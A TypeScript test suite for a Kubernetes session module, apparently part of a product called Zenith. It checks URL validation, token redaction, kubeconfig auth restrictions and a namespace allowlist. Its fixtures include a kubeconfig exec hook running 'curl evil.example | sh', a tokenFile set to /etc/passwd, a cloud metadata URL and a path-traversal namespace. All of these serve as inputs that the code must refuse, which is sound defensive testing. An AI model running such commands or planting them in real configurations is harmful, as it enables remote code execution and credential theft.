import { inspect } from "node:util";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { KubernetesConnectionConfig } from "@/lib/credentials/types";
import { createK8sClient, toK8sError } from "@/lib/providers/kubernetes/client";
import { createKubernetesSession, sessionNamespaces, validateServerUrl } from "@/lib/providers/kubernetes/session";
import { K8sError } from "@/lib/providers/kubernetes/types";
import { startFakeK8s, type FakeK8s } from "./fake-api";
import { ENV_ID, NS, OTHER_ENV, config, sessionFor } from "./helpers";

const SECRET_TOKEN = "eyJhbGciOiJSUzI1NiJ9-secret-token-0123456789";

let fake: FakeK8s;
beforeAll(async () => {
  fake = await startFakeK8s({ token: SECRET_TOKEN });
});
afterAll(async () => {
  await fake.close();
});

const cfg = (over: Partial<KubernetesConnectionConfig> = {}): KubernetesConnectionConfig => ({ ...config(fake), ...over });
const deps = (over = {}) => ({ resolveCredential: async () => SECRET_TOKEN, allowInsecureLoopback: true, ...over });

describe("server URL policy", () => {
  it("accepts https and normalizes the trailing slash", () => {
    expect(validateServerUrl("https://kube.example.com:6443/")).toBe("https://kube.example.com:6443");
  });
  it("refuses plain http except on loopback when the caller opts in", () => {
    expect(() => validateServerUrl("http://kube.example.com")).toThrow(/https/);
    expect(() => validateServerUrl("http://127.0.0.1:8080")).toThrow(/https/);
    expect(validateServerUrl("http://127.0.0.1:8080", true)).toBe("http://127.0.0.1:8080");
    expect(() => validateServerUrl("http://10.0.0.5:8080", true)).toThrow(/https/);
  });
  it("refuses metadata and link-local addresses, credentials in the URL, and junk", () => {
    expect(() => validateServerUrl("https://169.254.169.254/")).toThrow(/metadata|link-local/);
    expect(() => validateServerUrl("https://metadata.google.internal/")).toThrow(/metadata|link-local/);
    expect(() => validateServerUrl("https://user:pw@kube.example.com")).toThrow(/credentials/);
    expect(() => validateServerUrl("ftp://kube.example.com")).toThrow(/https/);
    expect(() => validateServerUrl("not a url")).toThrow(/valid URL/);
  });
});

describe("session construction", () => {
  it("resolves the credential reference and authenticates requests with it", async () => {
    let asked = "";
    const session = await createKubernetesSession(cfg(), deps({ resolveCredential: async (ref: string) => ((asked = ref), SECRET_TOKEN) }));
    expect(asked).toBe("vault:test/token");
    expect(session.provider).toBe("kubernetes");
    expect(session.server).toBe(fake.url);
    const client = createK8sClient(session);
    fake.seed({ apiVersion: "v1", kind: "Namespace", metadata: { name: "probe" } });
    await client.core.readNamespace({ name: "probe" });
    const call = fake.requests.filter((r) => r.path === "/api/v1/namespaces/probe").pop();
    expect(call?.authorized).toBe(true);
  });

  it("never exposes the token through serialization, inspection or errors", async () => {
    const session = await createKubernetesSession(cfg(), deps());
    expect(JSON.stringify(session)).not.toContain(SECRET_TOKEN);
    expect(inspect(session)).not.toContain(SECRET_TOKEN);
    expect(String(JSON.stringify({ s: session }))).not.toContain("eyJ");
    for (const bad of ["tok en with space", "short", "line\nbreak-token-123456", "x".repeat(9000)]) {
      const err = await createKubernetesSession(cfg(), deps({ resolveCredential: async () => bad })).catch((e: unknown) => e);
      expect(err).toBeInstanceOf(K8sError);
      expect((err as Error).message).not.toContain(bad.slice(0, 12));
    }
  });

  it("carries the namespace allowlist, and treats a session without one as empty", async () => {
    const session = await createKubernetesSession(cfg({ namespaces: ["a", "b"] }), deps());
    expect(sessionNamespaces(session)).toEqual(["a", "b"]);
    expect(sessionNamespaces({ provider: "kubernetes", server: "x", expiresAt: "", kubeConfig: () => ({}) })).toEqual([]);
  });

  it("refuses runner mode, a missing credential reference and missing token functions", async () => {
    await expect(createKubernetesSession(cfg({ mode: "runner" }), deps())).rejects.toThrow(/Runner-mode/);
    await expect(createKubernetesSession(cfg({ credentialRef: undefined }), deps())).rejects.toThrow(/no credential reference/);
    await expect(createKubernetesSession(cfg({ eks: { clusterName: "c", awsConnectionId: "a" } }), deps())).rejects.toThrow(/EKS token function/);
    await expect(createKubernetesSession(cfg({ mode: "oidc_web_identity" }), deps())).rejects.toThrow(/OIDC token function/);
  });

  it("uses the EKS token function and caps the session at the token's expiry", async () => {
    const now = new Date("2026-09-30T10:00:00Z");
    const session = await createKubernetesSession(
      cfg({ eks: { clusterName: "prod", awsConnectionId: "conn-1" } }),
      deps({
        now: () => now,
        ttlSec: 900,
        eksToken: async (eks: { clusterName: string }) => {
          expect(eks.clusterName).toBe("prod");
          return { token: SECRET_TOKEN, expiresAt: "2026-09-30T10:05:00Z" };
        },
      })
    );
    expect(session.expiresAt).toBe("2026-09-30T10:05:00.000Z");
  });

  it("refuses to hand out its KubeConfig after it expires", async () => {
    let t = new Date("2026-09-30T10:00:00Z");
    const session = await createKubernetesSession(cfg(), deps({ now: () => t, ttlSec: 60 }));
    expect(() => session.kubeConfig()).not.toThrow();
    t = new Date("2026-09-30T10:01:01Z");
    expect(() => session.kubeConfig()).toThrow(/expired/);
    expect(() => createK8sClient(session)).toThrow(/expired/);
  });

  it("refuses an already-expired token", async () => {
    const eks = cfg({ eks: { clusterName: "p", awsConnectionId: "a" } });
    await expect(
      createKubernetesSession(eks, deps({ now: () => new Date("2026-09-30T10:00:00Z"), eksToken: async () => ({ token: SECRET_TOKEN, expiresAt: "2026-09-30T09:00:00Z" }) }))
    ).rejects.toThrow(/expired/);
  });
});

describe("stored kubeconfigs", () => {
  const kubeconfig = (user: Record<string, unknown>, server = "https://attacker.example.com") =>
    [
      "apiVersion: v1",
      "kind: Config",
      "current-context: c",
      `clusters: [{name: x, cluster: {server: "${server}"}}]`,
      `users: [{name: u, user: ${JSON.stringify(user)}}]`,
      "contexts: [{name: c, context: {cluster: x, user: u}}]",
    ].join("\n");

  it("takes only the bearer token, never the server, from a kubeconfig", async () => {
    const session = await createKubernetesSession(cfg(), deps({ resolveCredential: async () => kubeconfig({ token: SECRET_TOKEN }) }));
    expect(session.server).toBe(fake.url);
    const client = createK8sClient(session);
    fake.seed({ apiVersion: "v1", kind: "Namespace", metadata: { name: "from-kubeconfig" } });
    await client.core.readNamespace({ name: "from-kubeconfig" });
    expect(fake.requests.filter((r) => r.path.endsWith("from-kubeconfig")).pop()?.authorized).toBe(true);
  });

  it("reads the same bearer token from a JSON kubeconfig and still refuses its auth exceptions", async () => {
    const json = (user: Record<string, unknown>) => JSON.stringify({ apiVersion: "v1", kind: "Config", "current-context": "c",
      clusters: [{ name: "x", cluster: { server: "https://attacker.example.com" } }], users: [{ name: "u", user }], contexts: [{ name: "c", context: { cluster: "x", user: "u" } }] });
    const session = await createKubernetesSession(cfg(), deps({ resolveCredential: async () => json({ token: SECRET_TOKEN }) }));
    expect(session.server).toBe(fake.url);
    await expect(createKubernetesSession(cfg(), deps({ resolveCredential: async () => json({ exec: { command: "sh" } }) }))).rejects.toThrow(/unsupported auth method/);
  });

  it.each([
    ["exec", { exec: { command: "sh", args: ["-c", "curl evil.example | sh"], apiVersion: "client.authentication.k8s.io/v1" } }],
    ["auth-provider", { "auth-provider": { name: "gcp" } }],
    ["tokenFile", { tokenFile: "/etc/passwd" }],
    ["client-certificate", { "client-certificate": "/etc/ssl/cert.pem", "client-key": "/etc/ssl/key.pem" }],
    ["basic auth", { username: "admin", password: "hunter2hunter2" }],
  ])("refuses a kubeconfig that uses %s", async (_name, user) => {
    const err = await createKubernetesSession(cfg(), deps({ resolveCredential: async () => kubeconfig(user) })).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(K8sError);
    expect((err as Error).message).toMatch(/unsupported auth method/);
    expect((err as Error).message).not.toContain("hunter2");
  });

  it("refuses an oversized kubeconfig before parsing it", async () => {
    const huge = "apiVersion: v1\nusers: []\n# " + "x".repeat(300 * 1024);
    await expect(createKubernetesSession(cfg(), deps({ resolveCredential: async () => huge }))).rejects.toThrow(/too large/);
  });

  it("accepts embedded client-certificate data and refuses a kubeconfig with nothing usable", async () => {
    await expect(createKubernetesSession(cfg(), deps({ resolveCredential: async () => kubeconfig({ "client-certificate-data": "Zm9v", "client-key-data": "YmFy" }) }))).resolves.toBeDefined();
    await expect(createKubernetesSession(cfg(), deps({ resolveCredential: async () => kubeconfig({}) }))).rejects.toThrow(/neither a token/);
    await expect(createKubernetesSession(cfg(), deps({ resolveCredential: async () => "apiVersion: v1\nusers: []" }))).rejects.toThrow(/no users/);
  });
});

describe("error normalization", () => {
  it("maps a rejected credential to `unauthorized` without echoing the token", async () => {
    const session = await createKubernetesSession(cfg(), deps({ resolveCredential: async () => "a-different-but-valid-token-0000" }));
    const client = createK8sClient(session);
    const err = await client.core.readNamespace({ name: "x" }).catch((e: unknown) => toK8sError(e));
    expect(err).toBeInstanceOf(K8sError);
    expect((err as K8sError).code).toBe("unauthorized");
    expect((err as Error).message).not.toContain("a-different");
  });

  it("maps connection refusal to `unreachable` and scrubs resolved secret values from server text", async () => {
    const dead = await createKubernetesSession(cfg({ server: "http://127.0.0.1:9" }), deps());
    const err = await createK8sClient(dead).core.readNamespace({ name: "x" }).catch((e: unknown) => toK8sError(e));
    expect((err as K8sError).code).toBe("unreachable");
    fake.inject({ match: (r) => r.path.endsWith("/echo"), status: 500, message: "boom value=canary-123456 Bearer abcdefghijklmnop", times: 1 });
    const live = await sessionFor(fake, []);
    const e2 = await createK8sClient(live).core.readNamespace({ name: "echo" }).catch((e: unknown) => toK8sError(e, ["canary-123456"]));
    expect((e2 as Error).message).not.toContain("canary-123456");
    expect((e2 as Error).message).not.toContain("abcdefghijklmnop");
  });
});

describe("namespace allowlist", () => {
  const ns = (name: string, labels: Record<string, string> = {}, annotations: Record<string, string> = {}) =>
    fake.seed({ apiVersion: "v1", kind: "Namespace", metadata: { name, labels, annotations } });

  it("passes allowlisted namespaces without any API call", async () => {
    const before = fake.requests.length;
    const client = createK8sClient(await sessionFor(fake, ["team-a"]));
    await client.guard.assert("team-a");
    expect(fake.requests.length).toBe(before);
  });

  it("rejects a namespace outside the allowlist that Zenith did not create", async () => {
    ns("foreign");
    const client = createK8sClient(await sessionFor(fake, [NS]), { environmentId: ENV_ID });
    await expect(client.guard.assert("foreign")).rejects.toMatchObject({ code: "namespace_forbidden" });
    await expect(client.guard.assert("does-not-exist")).rejects.toMatchObject({ code: "not_found" });
  });

  it("admits a Zenith-created, labeled namespace for this environment only", async () => {
    ns("mine", { "app.kubernetes.io/managed-by": "zenith" }, { "zenith.dev/environment": ENV_ID });
    ns("theirs", { "app.kubernetes.io/managed-by": "zenith" }, { "zenith.dev/environment": OTHER_ENV });
    const client = createK8sClient(await sessionFor(fake, []), { environmentId: ENV_ID });
    await expect(client.guard.assert("mine")).resolves.toBeUndefined();
    await expect(client.guard.assert("theirs")).rejects.toMatchObject({ code: "namespace_forbidden" });
  });

  it("fails closed when the lookup itself is forbidden, and rejects malformed names", async () => {
    fake.inject({ match: (r) => r.path === "/api/v1/namespaces/locked", status: 403, message: "forbidden", times: 1 });
    const client = createK8sClient(await sessionFor(fake, []), { environmentId: ENV_ID });
    await expect(client.guard.assert("locked")).rejects.toMatchObject({ code: "namespace_forbidden" });
    await expect(client.guard.assert("../../etc")).rejects.toMatchObject({ code: "bad_input" });
    await expect(client.guard.assert("UPPER")).rejects.toMatchObject({ code: "bad_input" });
  });

  it("treats a namespace this batch is about to create as Zenith-created", async () => {
    const client = createK8sClient(await sessionFor(fake, []), { environmentId: ENV_ID });
    client.guard.registerZenithCreated("brand-new");
    await expect(client.guard.assert("brand-new")).resolves.toBeUndefined();
  });
});
